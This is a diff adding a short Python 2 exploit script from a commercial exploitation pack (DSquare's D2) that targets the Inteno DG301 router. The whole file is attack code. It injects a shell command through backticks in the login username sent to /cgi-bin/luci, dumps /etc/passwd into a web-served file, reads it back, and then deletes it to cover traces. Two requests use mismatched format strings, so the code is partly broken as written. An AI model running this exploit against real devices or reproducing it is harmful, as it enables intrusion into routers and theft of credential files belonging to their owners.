@@ -1,0 +1,47 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import cStringIO
+import urllib, urllib2
+
+_name_   = 'd2sec_inteno_1'
+_vendor_ = 'inteno'
+_model_  = ['DG301']
+_vuln_   = 'Command Injection'
+_cve_    = ''
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  headers = { "User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"}
+  try:
+    data = "username=user`"+ urllib.quote("cat /etc/passwd") + "%20>%20/www/.p.txt`&password=pass"
+    r = urllib2.Request("http://%s/cgi-bin/luci" % host, data, headers)
+    results = urllib2.urlopen(r).read()
+    r = urllib2.Request("http://%s:%s/.p.txt" % host, None, headers)
+    results = urllib2.urlopen(r).read()
+    if not results:
+      print "[+] %s is not vulnerable" % host
+      return
+    print "[+] %s is vulnerable" % host
+    print results
+    data = "username=user`rm%20/www/.p.txt`&password=pass"
+    r = urllib2.Request("http://%s:%s/cgi-bin/luci" % host, data, headers)
+    results = urllib2.urlopen(r).read()
+  except urllib2.URLError:
+    print "[-] error: The connection could not be established.\n"
+  except IOError as e:
+    print "[-] error: {0}...\n".format(e.strerror)
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
